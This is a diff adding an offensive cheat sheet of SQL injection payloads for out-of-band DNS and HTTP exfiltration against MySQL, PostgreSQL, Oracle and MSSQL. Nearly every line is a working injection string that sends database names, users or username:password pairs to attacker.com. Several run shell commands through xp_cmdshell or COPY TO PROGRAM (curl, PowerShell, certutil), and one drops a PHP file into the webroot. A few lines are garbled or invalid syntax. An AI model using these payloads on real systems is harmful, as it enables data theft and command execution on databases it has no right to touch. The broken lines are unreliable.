@@ -1,0 +1,74 @@
+# OUT-OF-BAND (OOB) DNS / HTTP DATA EXFIL
+# Blind injection that has no releasable output: append the leaked value to a
+# subdomain and watch your Collaborator / interactsh / dnslog inbox.
+# Replace attacker.com with YOUR COLLABORATOR HOSTNAME. Use hex to avoid quote hell.
+
+## 1) MySQL - LOAD_FILE DNS exfil (FILE priv needed)
+# Leaks database(), version(), user()
+1' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))-- -
+1' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))-- -
+1' AND LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))-- -
+1' AND LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),'.attacker.com\\a'))-- -
+1' AND LOAD_FILE(CONCAT('\\\\',(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1),'.attacker.com\\a'))-- -
+1' AND LOAD_FILE(CONCAT('\\\\',(SELECT hex(concat(username,0x3a,password)) FROM users LIMIT 1),'.attacker.com\\a'))-- -
+# 64-char rule: if target is long, leak SUBSTRING slices.
+1' AND LOAD_FILE(CONCAT('\\\\',SUBSTRING((SELECT hex(database())),1,31),'.attacker.com\\a'))-- -
+1' AND LOAD_FILE(CONCAT('\\\\',SUBSTRING((SELECT hex(database())),32,31),'.attacker.com\\a'))-- -
+
+## 2) MySQL - SELECT ... INTO OUTFILE to UNC (Windows)
+1' UNION SELECT NULL,password INTO OUTFILE '\\\\attacker.com\\share\\out' FROM users-- -
+# Alternative (Linux pik see below - OUTFILE to webroot):
+1' UNION SELECT NULL,password INTO OUTFILE '/var/www/html/oob.txt' FROM users-- -
+
+## 3) MySQL - SECURE-FILE-PRIV on = use INTO DUMPFILE inside webroot
+1' UNION SELECT 0x3C3F706870... INTO DUMPFILE '/var/www/html/oob.php'-- -
+
+## 4) PostgreSQL - via HTTP (most useful since no native http funcs)
+# PG 9.0+ has pg_read_file, no http; use dblink_connect to a DB on your box:
+' UNION SELECT dblink_connect('host=attacker.com user=x password=x dbname=x')-- -
+# or use server-side COPY to program/pipe (superuser):
+' UNION SELECT NULL FROM pg_execute_server_program('curl http://attacker.com/')-- -
+1'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v='-- -   # stacked + superuser
+# PG 14+: CREATE EXTENSION http (superuser)
+' UNION SELECT NULL FROM http_get('http://attacker.com/')-- -
+
+## 5) Oracle - UTL_HTTP (burnt on updated DBs but still appears)
+1' OR (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual)-- -
+1' OR (SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual)-- -
+1' OR (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||SYS.DBMS_LOB.SUBSTR(SYS.SYSX.(select dump((SELECT user from dual))),1)) FROM dual)-- -
+# Oracle 12c+ UTL_HTTP disabled - try UTL_TCP or ACL
+1' OR (SELECT UTL_INADDR.GET_HOST_NAME('attacker.com') FROM dual)-- -   # simple conn check
+
+## 6) MSSQL - xp_dirtree / xp_fileexist UNC (MSSQL <2012 classic, still runs)
+1'; EXEC master..xp_dirtree '\\\\attacker.com\\'-- -
+1'; EXEC master..xp_fileexist '\\\\attacker.com\\'-- -
+1'; EXEC master..xp_subdirs '\\\\attacker.com\\'-- -
+# Auth network share: EXEC master..xp_create_subdir '\\attacker.com\share'
+1'; EXEC master.sys.xp_dirtree '\\\\'+DB_NAME()+'.attacker.com\\'-- -
+# Modern (2012+): OPENROWSET / BULK read to probe + fn_get_audit_file
+1'; SELECT * FROM OPENROWSET(BULK '\\\\attacker.com\\f', SINGLE_UPLOB) AS x-- -
+1'; SELECT * FROM fn_get_audit_file('\\\\attacker.com\\%', DEFAULT, DEFAULT)-- -
+
+## 7) MSSQL - since 2012 xp_cmdshell unrestricted for dba, data via curl:
+1'; EXEC master..xp_cmdshell 'curl http://attacker.com/?'"'"(SELECT+user)-- -
+# PowerShell corridor:
+1'; EXEC xp_cmdshell 'powershell -nop -c "iwr http://attacker.com/?d=$(whoami)"'-- -
+
+## 8) DNS-only endpoint (no HTTP allowed) - any DB that will resolve a host:
+# MySQL LOAD_FILE (above), PG via dblink host=, Oracle UTL_INADDR, MSSQL xp_dirtree.
+# Each resolve-me string creates a DNS query  attacker.com <value we picked BEFORE connection.
+# For CHAR-AT-A-TIME exfil use CASE/LENGTH to pick value first, then resolve.
+
+## 9) When outbound is firewalled to TCP 22/443 only - retry via HTTPS callback:
+# Oracle: UTL_HTTPS? no. Use DBMS_NETWORK_ACL_ADMIN to allow host then UTL_HTTP to https endpoint
+# (most will fail quietly; log the failure message for INFOSLEUTH instead).
+# MSSQL: certutil to steal via https:
+1'; EXEC xp_cmdshell 'certutil -urlcache -f https://attacker.com/ 1'-- -
+# PG: dblink to your POSTGRES server on 443 (not http) as 'host=attacker.com' - the connect string
+#     itself carries the data in host/port/user fields.
+
+## 10) Blind collaboration checks
+1' AND (SELECT 1 FROM mysql.general_log) IS NULL-- -
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND LOAD_FILE('\\\\ping.attacker.com\\a')-- -
+# PG - trigger the connect only when condition true:
+1' AND (SELECT LENGTH((SELECT version()))=10 AND dblink_connect('host=attacker.com')) IS NOT NULL-- -
